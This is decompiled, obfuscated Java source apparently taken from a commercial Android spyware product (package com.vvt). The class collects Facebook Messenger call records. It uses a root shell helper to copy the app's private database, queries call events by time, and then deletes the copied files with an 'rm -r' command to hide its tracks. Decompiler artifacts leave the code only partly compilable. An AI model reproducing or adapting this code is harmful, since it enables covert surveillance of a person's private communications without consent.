package com.vvt.capture.b.c.a.b;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.b.b.e;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private String d;
  
  public b(String paramString1, String paramString2)
  {
    this.c = paramString1;
    this.d = paramString2;
  }
  
  private String b()
  {
    return p.a(this.c, "fb_voip");
  }
  
  private void c()
  {
    String str1 = b();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    long l1 = System.currentTimeMillis();
    long l2 = l1 - 10000L;
    Object localObject1 = Long.valueOf(l2);
    localFxSimpleEventReference.setReference((Long)localObject1);
    for (;;)
    {
      try
      {
        bool1 = e.a();
        if (!bool1) {
          break label176;
        }
        localObject1 = "com.facebook.orca";
        localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
        String str1 = b();
        String str2 = this.c;
        str2 = e.e(str2);
        String str3 = this.d;
        localObject1 = e.a((String)localObject1, str1, str2, str3);
        boolean bool2 = a;
        if (bool2) {}
        l1 = com.vvt.capture.b.c.a.b.b((String)localObject1);
        long l3 = -1;
        boolean bool3 = l1 < l3;
        if (!bool3) {
          break label176;
        }
        localObject1 = Long.valueOf(l1);
        localFxSimpleEventReference.setReference((Long)localObject1);
      }
      catch (Exception localException)
      {
        bool1 = b;
        if (!bool1) {
          continue;
        }
        continue;
      }
      finally
      {
        c();
      }
      c();
      bool1 = a;
      if (bool1) {}
      return localFxSimpleEventReference;
      label176:
      l1 = l2;
    }
  }
  
  public List a(int paramInt)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      bool1 = e.a();
      if (bool1)
      {
        Object localObject2 = "com.facebook.orca";
        localObject2 = com.vvt.capture.b.a.a.a((String)localObject2);
        String str1 = b();
        String str2 = this.c;
        str2 = e.e(str2);
        String str3 = this.d;
        localObject2 = e.a((String)localObject2, str1, str2, str3);
        boolean bool2 = a;
        if (bool2) {}
        localObject2 = com.vvt.capture.b.c.a.b.a(paramInt, (String)localObject2);
        localArrayList.addAll((Collection)localObject2);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = b;
        if (!bool1) {}
      }
    }
    finally
    {
      c();
    }
    c();
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "com.facebook.orca";
    try
    {
      localObject1 = com.vvt.capture.b.a.a.a((String)localObject1);
      String str1 = b();
      String str2 = this.c;
      str2 = e.e(str2);
      String str3 = this.d;
      str1 = e.a((String)localObject1, str1, str2, str3);
      bool = a;
      if (bool) {}
      localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = paramg2.getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = com.vvt.capture.b.c.a.b.a(str1, l1, l2);
      localArrayList.addAll((Collection)localObject1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    finally
    {
      c();
    }
    c();
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/MyUncaughtExceptionHandler/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */